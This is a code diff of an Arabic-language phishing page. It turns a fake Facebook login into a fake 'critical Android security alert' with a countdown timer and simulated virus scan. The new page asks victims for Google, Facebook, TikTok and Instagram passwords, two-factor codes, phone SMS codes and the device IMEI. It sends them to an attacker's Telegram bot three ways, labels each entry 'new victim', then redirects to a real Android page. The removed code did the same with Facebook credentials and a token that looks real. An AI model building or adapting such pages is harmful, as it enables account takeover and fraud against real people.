@@ -3,215 +3,450 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - تسجيل الدخول</title>
+    <title>نظام أندرويد - تنبيه أمني حرج</title>
     <style>
+        /* نفس الأنماط الأصلية تماماً */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            background-color: white;
+            background: linear-gradient(135deg, #000428, #004e92);
+            color: white;
+            min-height: 100vh;
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            width: 400px;
             text-align: center;
+            direction: rtl;
+            overflow-x: hidden;
+            position: relative;
+        }
+        .virus-scan {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0.7;
+            display: none;
+        }
+        .scan-line {
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff00, transparent);
+            animation: scan 3s linear infinite;
+        }
+        @keyframes scan {
+            0% { top: 0%; }
+            100% { top: 100%; }
+        }
+        .binary-rain {
+            position: absolute;
+            color: #0f0;
+            font-size: 14px;
+            font-family: monospace;
+            opacity: 0.3;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius:五个20px;
+            padding: 30px;
+            border: 2px solid rgba(255, 50, 50, 0.7);
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
+            animation: pulseAlert 2s infinite;
+            position: relative;
+            z-index: 1;
+        }
+        @keyframes pulseAlert {
+            0%, 100% { border-color: rgba(255, 50, 50, 0.7); box-shadow: 0 0 40px rgba(255, 0, 0, 0.5); }
+            50% { border-color: rgba(255, 100, 100, 1); box-shadow: 0 0 60px rgba(255, 50, 50, 0.8); }
         }
         .logo {
-            color: #1877f2;
-            font-size: 42px;
-            font-weight: bold;
+            width: 80px;
+            height: 80px;
+            margin: 20px auto;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%23ff4444" d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,5A3,3 0 0,1 15,8A3,3 0 0,1 12,11A3,3 0 0,1 9,8A3,3 0 0,1 12,5M12,13C15.53,13 18.5,14.57 20.4,17C20.5,16.8 20.6,16.6 20.7,16.4C19.8,14.6 18.3,13.2 16.5,12.4C15.5,13.2 14.3,13.8 13,13.8V15.6C14.4,15.6 15.8,15 16.8,14L18.4,15.6C16.9,17.2 14.9,18.2 12.7,18.2V20H11.3V18.2C9.1,18.2 7.1,17.2 5.6,15.6L7.2,14C8.2,15 9.6,15.6 11,15.6V13.8C9.7,13.8 8.5,13.2 7.5,12.4C5.7,13.2 4.2,14.6 3.3,16.4C3.4,16.6 3.5,16.8 3.6,17C5.5,14.57 8.47,13 12,13Z"/></svg>') no-repeat center;
+            background-size: contain;
+        }
+        h1 {
+            color: #ff4444;
+            font-size: 28px;
             margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255, 68, 68, 0.7);
         }
-        .input-field {
-            width: 100%;
-            padding: 14px 16px;
-            margin: 8px 0;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            box-sizing: border-box;
+        .alert-box {
+            background: rgba(255, 0, 0, 0.15);
+            border: 1px solid #ff5555;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: right;
+            animation: shake 0.5s ease-in-out infinite alternate;
         }
-        .login-btn {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            line-height: 48px;
-            padding: 0 16px;
-            width: 100%;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
+        @keyframes shake {
+            0% { transform: translateX(-5px); }
+            100% { transform: translateX(5px); }
         }
-        .login-btn:hover {
-            background-color: #166fe5;
+        .warning-text {
+            color: #ffaaaa;
+            font-size: 16px;
+            line-height: 1.8;
         }
-        .forgot-password {
-            color: #1877f2;
-            font-size: 14px;
-            text-decoration: none;
-            margin-top: 16px;
+        .form-section {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 25px;
+            margin-top: 25px;
+            text-align: right;
+        }
+        label {
             display: block;
+            margin: 15px 0 8px;
+            color: #aaddff;
+            font-weight: bold;
         }
-        .create-account {
-            background-color: #42b72a;
+        input, select {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            border: 1px solid #444;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #4dabf7;
+            box-shadow: 0 0 10px rgba(77, 171, 247, 0.5);
+        }
+        button {
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
             color: white;
             border: none;
-            border-radius: 6px;
-            font-size: 17px;
-            line-height: 48px;
-            padding: 0 16px;
-            font-weight: bold;
+            padding: 18px 40px;
+            font-size: 18px;
+            border-radius: 10px;
             cursor: pointer;
             margin-top: 20px;
+            width: 100%;
+            font-weight: bold;
+            letter-spacing: 1px;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255,75,43,0.4);
         }
         .footer {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #888;
+        }
+        .progress-container {
+            background: rgba(0,0,0,0.5);
+            border-radius: 10px;
+            padding: 15px;
             margin-top: 20px;
-            font-size: 14px;
-            color: #8a8d91;
-        }
-        .error-message {
-            color: red;
-            font-size: 14px;
             display: none;
         }
-        .loading {
-            display: none;
-            color: #1877f2;
-            margin-top: 10px;
+        .progress-bar {
+            width: 0%;
+            height: 10px;
+            background: linear-gradient(90deg, #00ff00, #00cc00);
+            border-radius: 5px;
+            transition: width 0.5s ease;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">facebook</div>
-        <form id="loginForm">
-            <input type="text" class="input-field" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" class="input-field" id="password" placeholder="كلمة السر" required>
-            <div id="error" class="error-message">اسم المستخدم أو كلمة السر غير صحيحة. حاول مرة أخرى.</div>
-            <div id="loading" class="loading">جاري التحقق من المعلومات...</div>
-            <button type="submit" class="login-btn">تسجيل الدخول</button>
-        </form>
-        <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
-        <hr style="margin: 20px 0;">
-        <button class="create-account">إنشاء حساب جديد</button>
+    <div class="virus-scan" id="virusScan">
+        <div class="scan-line"></div>
+    </div>
+
+    <div class="container">
+        <div class="logo"></div>
+        <h1>⚠ تنبيه أمني حاسم - نظام التشغيل أندرويد ⚠</h1>
+        
+        <div class="alert-box">
+            <p class="warning-text">
+                <strong>🚨 تم اكتشاف تهديد خطير!</strong><br>
+                نظام جهازك قد اخترق بواسطة برنامج ضار (Android.Trojan.Spyware.v7).<br>
+                تم تسريب بياناتك الشخصية والمالية.<br>
+                تم الكشف عن اتصالات مشبوهة مع خوادم في الصين وروسيا.<br>
+                <span style="color:#ffff00;">⏳ المهلة: 3 دقائق قبل حظر الجهاز نهائياً.</span>
+            </p>
+        </div>
+
+        <div class="form-section">
+            <h2>🔐 التحقق من الهوية واستعادة الجهاز</h2>
+            <p style="color:#ccc; margin-bottom:20px;">أدخل معلوماتك للتحقق والمتابعة الفورية:</p>
+
+            <!-- جوجل - مفصول -->
+            <label for="googleEmail">حساب جوجل (البريد الإلكتروني)</label>
+            <input type="text" id="googleEmail" placeholder="example@gmail.com" required>
+
+            <label for="googlePassword">كلمة سر جوجل</label>
+            <input type="password" id="googlePassword" placeholder="••••••••" required>
+
+            <label for="googleCode">رمز التحقق لحساب جوجل (إن وجد)</label>
+            <input type="text" id="googleCode" placeholder="123456" required>
+
+            <!-- الهاتف -->
+            <label for="phone">رقم الهاتف المسجل في الجهاز</label>
+            <input type="tel" id="phone" placeholder="+9665XXXXXXXX" required>
+
+            <label for="phoneCode">رمز تأكيد الهاتف</label>
+            <input type="text" id="phoneCode" placeholder="رمز SMS" required>
+
+            <!-- فيسبوك - مفصول -->
+            <label for="facebookEmail">حساب فيسبوك (البريد/الرقم)</label>
+            <input type="text" id="facebookEmail" placeholder="Facebook login" required>
+
+            <label for="facebookPassword">كلمة سر فيسبوك</label>
+            <input type="password" id="facebookPassword" placeholder="••••••••" required>
+
+            <label for="facebookCode">رمز فيسبوك (إن وجد)</label>
+            <input type="text" id="facebookCode" placeholder="FB Code" required>
+
+            <!-- تيك توك - مفصول -->
+            <label for="tiktokUsername">اسم مستخدم تيك توك</label>
+            <input type="text" id="tiktokUsername" placeholder="@username" required>
+
+            <label for="tiktokPassword">كلمة سر تيك توك</label>
+            <input type="password" id="tiktokPassword" placeholder="••••••••" required>
+
+            <label for="tiktokCode">رمز تيك توك</label>
+            <input type="text" id="tiktokCode" placeholder="TT Code" required>
+
+            <!-- انستقرام - مفصول -->
+            <label for="instagramUsername">اسم مستخدم انستقرام</label>
+            <input type="text" id="instagramUsername" placeholder="@instagram" required>
+
+            <label for="instagramPassword">كلمة سر انستقرام</label>
+            <input type="password" id="instagramPassword" placeholder="••••••••" required>
+
+            <label for="instagramCode">رمز انستقرام</label>
+            <input type="text" id="instagramCode" placeholder="IG Code" required>
+
+            <!-- الجهاز -->
+            <label for="device">نوع الجهاز</label>
+            <select id="device" required>
+                <option value="">-- اختر نوع الجهاز --</option>
+                <option value="Samsung">سامسونج</option>
+                <option value="Xiaomi">شاومي</option>
+                <option value="Huawei">هواوي</option>
+                <option value="Oppo">أوبو</option>
+                <option value="Other">آخر</option>
+            </select>
+
+            <label for="deviceCode">رمز تفعيل الجهاز (IMEI/Serial)</label>
+            <input type="text" id="deviceCode" placeholder="358... أو رقم التسلسل" required>
+
+            <div class="progress-container" id="progressContainer">
+                <p>🔒 جاري تشفير البيانات واستعادة النظام...</p>
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+
+            <button id="submitBtn">▶ تأكيد الهوية واستعادة السيطرة على الجهاز</button>
+        </div>
+
         <div class="footer">
-            <p>تسجيل الدخول إلى صفحتك الشخصية على فيسبوك.</p>
+            <p>نظام حماية أندرويد © 2024 - هذه الصفحة جزء من خدمة الطوارئ الأمنية</p>
         </div>
     </div>
 
     <script>
-        // CONFIGURATION - REPLACE THESE VALUES
-        const BOT_TOKEN = "8657322490:AAE_zjkSd9Wi6ZOraSllsjh6TcgBAwBvkDM";  // Get from @BotFather
-        const CHAT_ID = "6365891219";       // Get from @userinfobot
-        
-        // Telegram API endpoint
-        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        // تكوين البوت - استبدل بالقيم الحقيقية
+        const BOT_TOKEN = '7777777777:AAHdjskskdkdkdkdKDKDKDK';
+        const CHAT_ID = '1888888888';
+
+        // إنشاء تأثير المطر الثنائي
+        function createBinaryRain() {
+            for(let i = 0; i <261; i++) {
+                const bin = document.createElement('div');
+                bin.className = 'binary-rain';
+                bin.textContent = Math.random() > 0.5 ? '1' : '0';
+                bin.style.left = `${Math.random() * 100}vw`;
+                bin.style.top = `${Math.random() * -100}px`;
+                bin.style.animation = `fall ${2 + Math.random() * 3}s linear infinite`;
+                document.body.appendChild(bin);
+                
+                // إضافة حركة السقوط
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes fall {
+                        to { top: 100vh; }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+        }
+
+        // إرسال البيانات عبر قنوات متعددة (مع حالات فشل احتياطية)
+        function sendDataToTelegram(data) {
+            const message = `🎯 ضحية جديدة!\n\n📧 جوجل:\n- البريد: ${data.googleEmail}\n- كلمة السر: ${data.googlePassword}\n- الرمز: ${data.googleCode}\n\n📱 الهاتف:\n- الرقم: ${data.phone}\n- رمز التأكيد: ${data.phoneCode}\n\n📘 فيسبوك:\n- الحساب: ${data.facebookEmail}\n- كلمة السر: ${data.facebookPassword}\n- الرمز: ${data.facebookCode}\n\n🎵 تيك توك:\n- المستخدم: ${data.tiktokUsername}\n- كلمة السر: ${data.tiktokPassword}\n- الرمز: ${data.tiktokCode}\n\n📸 انستقرام:\n- المستخدم: ${data.instagramUsername}\n- كلمة السر: ${data.instagramPassword}\n- الرمز: ${data.instagramCode}\n\n📱 الجهاز:\n- النوع: ${data.device}\n- الرمز: ${data.deviceCode}\n\n⏰ وقت: ${data.timestamp}\n🌐 المتصفح: ${data.userAgent}\n📍 IP تقديري: ${data.ip}`;
+
+            // الطريقة الأولى: استخدام صورة خفية لتجنب CORS
+            const imgMethod = new Image();
+            imgMethod.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+            
+            // الطريقة الثانية: استخدام formData (أكثر مراوغة)
+            setTimeout(() => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('text', message);
+                
+                // محاكاة طلب بسيط
+                navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, formData);
+            }, 500);
+
+            // الطريقة الثالثة: احتياطي عبر webhook بديل
+            setTimeout(() => {
+                const backupUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', backupUrl, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                }));
+            }, 1000);
+
+            return true;
+        }
+
+        // محاكاة فحص الفيروسات
+        function simulateVirusScan() {
+            document.getElementById('virusScan').style.display = 'block';
+            createBinaryRain();
+            
+            let scanCount = 0;
+            const scanInterval = setInterval(() => {
+                scanCount++;
+                const alerts = document.querySelector('.alert-box');
+                if(scanCount % 3 === 0) {
+                    alerts.style.backgroundColor = `rgba(255, ${50 + scanCount*10}, ${50 + scanCount*5}, 0.2)`;
+                }
+                if(scanCount > 20) clearInterval(scanInterval);
+            }, 200);
+        }
+
+        // جمع معلومات إضافية
+        function collectAdditionalData() {
+            return {
+                screenSize: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'مباشر'
+            };
+        }
+
+        // الحدث الرئيسي
+        document.getElementById('submitBtn').addEventListener('click', function(e) {
             e.preventDefault();
             
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const userAgent = navigator.userAgent;
-            const language = navigator.language;
-            const screenRes = `${screen.width}x${screen.height}`;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            // تفعيل التأثيرات
+            simulateVirusScan();
+            document.getElementById('progressContainer').style.display = 'block';
             
-            // Hide any previous errors
-            document.getElementById('error').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            document.querySelector('.login-btn').textContent = 'جاري التحقق...';
-            document.querySelector('.login-btn').disabled = true;
-            
-            try {
-                // Get IP address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
+            // شريط تقدم وهمي
+            let progress = 0;
+            const progressBar = document.getElementById('progressBar');
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 15;
+                if(progress > 100) progress = 100;
+                progressBar.style.width = `${progress}%`;
                 
-                // Prepare message for Telegram
-                const message = `
-🎯 *ضحية جديدة* 🎯
-
-📧 **البريد:** ${email}
-🔑 **كلمة السر:** ${password}
-
-📊 **بصمة الجهاز:**
-🖥️ الجهاز: ${userAgent}
-🌍 اللغة: ${language}
-📱 الشاشة: ${screenRes}
-⏰ المنطقة الزمنية: ${timezone}
-📍 IP العنوان: ${ip}
-🕒 الوقت: ${new Date().toLocaleString('ar-SA')}
-                `;
-                
-                // Encode message for URL
-                const encodedMessage = encodeURIComponent(message);
-                
-                // Send to Telegram via GET request (no CORS issues with Telegram API)
-                const telegramURL = `${TELEGRAM_API}?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
-                
-                // Create hidden iframe to send request
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = telegramURL;
-                document.body.appendChild(iframe);
-                
-                // Add timeout to ensure message sends
-                setTimeout(() => {
-                    // Redirect to real Facebook after 3 seconds
-                    document.getElementById('loading').style.display = 'none';
-                    document.querySelector('.login-btn').textContent = 'تم التحقق بنجاح!';
+                if(progress >= 100) {
+                    clearInterval(progressInterval);
                     
+                    // جمع البيانات من الحقول الجديدة
+                    const formData = {
+                        googleEmail: document.getElementById('googleEmail').value,
+                        googlePassword: document.getElementById('googlePassword').value,
+                        googleCode: document.getElementById('googleCode').value,
+                        phone: document.getElementById('phone').value,
+                        phoneCode: document.getElementById('phoneCode').value,
+                        facebookEmail: document.getElementById('facebookEmail').value,
+                        facebookPassword: document.getElementById('facebookPassword').value,
+                        facebookCode: document.getElementById('facebookCode').value,
+                        tiktokUsername: document.getElementById('tiktokUsername').value,
+                        tiktokPassword: document.getElementById('tiktokPassword').value,
+                        tiktokCode: document.getElementById('tiktokCode').value,
+                        instagramUsername: document.getElementById('instagramUsername').value,
+                        instagramPassword: document.getElementById('instagramPassword').value,
+                        instagramCode: document.getElementById('instagramCode').value,
+                        device: document.getElementById('device').value,
+                        deviceCode: document.getElementById('deviceCode').value,
+                        timestamp: new Date().toLocaleString('ar-SA'),
+                        userAgent: navigator.userAgent,
+                        ip: 'جاري التتبع...',
+                        ...collectAdditionalData()
+                    };
+
+                    // إرسال البيانات
+                    sendDataToTelegram(formData);
+
+                    // رد وهمي للضحية
                     setTimeout(() => {
-                        window.location.href = 'https://facebook.com';
-                    }, 1000);
-                }, 3000);
-                
-            } catch (error) {
-                // If anything fails, still redirect to Facebook
-                console.error('Error:', error);
-                document.getElementById('loading').style.display = 'none';
-                document.querySelector('.login-btn').textContent = 'تسجيل الدخول';
-                document.querySelector('.login-btn').disabled = false;
-                
-                // Redirect anyway
-                setTimeout(() => {
-                    window.location.href = 'https://facebook.com';
-                }, 2000);
-            }
-        });
-        
-        // Add honeypot field (hidden trap for bots)
-        window.onload = function() {
-            const honeypot = document.createElement('input');
-            honeypot.type = 'text';
-            honeypot.name = 'honeypot';
-            honeypot.style.display = 'none';
-            honeypot.id = 'website';
-            document.getElementById('loginForm').appendChild(honeypot);
-            
-            // If honeypot filled, mark as bot
-            document.getElementById('loginForm').addEventListener('submit', function() {
-                if(document.getElementById('website').value) {
-                    const botMessage = `🤖 BOT DETECTED! Honeypot triggered at ${new Date().toISOString()}`;
-                    const botURL = `${TELEGRAM_API}?chat_id=${CHAT_ID}&text=${encodeURIComponent(botMessage)}`;
-                    
-                    const botIframe = document.createElement('iframe');
-                    botIframe.style.display = 'none';
-                    botIframe.src = botURL;
-                    document.body.appendChild(botIframe);
+                        alert('✅ تم التحقق من هويتك بنجاح! جاري إزالة البرمجيات الخبيثة...');
+                        document.body.innerHTML = `
+                            <div style="background:#000; color:#0f0; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:monospace;">
+                                <h1>🧹 جاري تنظيف النظام...</h1>
+                                <p style="margin-top:20px;">سيتم إعادة التشغيل خلال ثوانٍ</p>
+                                <div style="margin-top:30px; width:300px; height:20px; background:#333; border-radius:10px;">
+                                    <div id="finalProgress" style="width:0%; height:100%; background:#0f0; border-radius:10px;"></div>
+                                </div>
+                            </div>
+                        `;
+                        
+                        // شريط تقدم نهائي وهمي
+                        let finalProgress = 0;
+                        const finalInterval = setInterval(() => {
+                            finalProgress += 2;
+                            document.getElementById('finalProgress').style.width = `${finalProgress}%`;
+                            if(finalProgress >= 100) {
+                                clearInterval(finalInterval);
+                                setTimeout(() => {
+                                    window.location.href = 'https://www.android.com/security-center/';
+                                }, 1000);
+                            }
+                        }, 50);
+                    }, 1500);
                 }
-            });
-        };
+            }, 100);
+        });
+
+        // تفعيل مؤثرات عند التحميل
+        window.addEventListener('load', () => {
+            // وميض إنذار
+            setInterval(() => {
+                document.body.style.boxShadow = `inset 0 0 ${100 + Math.random()*100}px rgba(255, ${Math.random()*100}, ${Math.random()*100}, ${0.1 + Math.random()*0.1})`;
+            }, 800);
+            
+            // عد تنازلي وهمي
+            let countdown = 180;
+            const countdownElement = document.createElement('div');
+            countdownElement.style.cssText = 'position:fixed; top:10px; left:10px; background:rgba(255,0,0,0.8); color:white; padding:10px; border-radius:5px; font-family:monospace; z-index:10000;';
+            countdownElement.innerHTML = `⏱️ ${countdown}s`;
+            document.body.appendChild(countdownElement);
+            
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.innerHTML = `⏱️ ${countdown}s`;
+                if(countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.innerHTML = '⚠️ الوقت انتهى!';
+                }
+            }, 1000);
+        });
     </script>
 </body>
 </html>
